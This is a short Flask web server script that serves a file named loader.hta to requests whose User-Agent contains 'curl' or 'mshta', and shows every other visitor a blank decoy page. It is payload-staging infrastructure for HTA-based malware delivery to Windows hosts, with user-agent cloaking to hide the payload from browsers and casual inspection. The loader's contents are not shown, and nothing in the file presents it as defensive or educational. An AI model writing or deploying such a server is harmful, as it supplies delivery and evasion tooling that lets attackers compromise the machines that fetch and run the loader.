from flask import Flask, request, send_file, abort
import logging
import os

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/loader.hta', methods=['GET'])
def loader():
    try:
        return send_file('loader.hta', mimetype='application/octet-stream')
    except FileNotFoundError:
        logger.error('loader.hta not found')
        return '', 204

@app.route('/', methods=['GET'])
def index():
    user_agent = request.headers.get('User-Agent', '')
    if 'curl' in user_agent or 'mshta' in user_agent:
        try:
            return send_file('loader.hta', mimetype='application/octet-stream')
        except FileNotFoundError:
            logger.error('loader.hta not found')
            return '', 204
    else:
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>wallahi im 400kg</title>
            <style>
                body { background-color: white; }
            </style>
        </head>
        <body></body>
        </html>
        '''

if __name__ == '__main__':
    host = os.getenv('FLASK_HOST', '0.0.0.0')
    port = int(os.getenv('FLASK_PORT', 80))
    app.run(host=host, port=port)
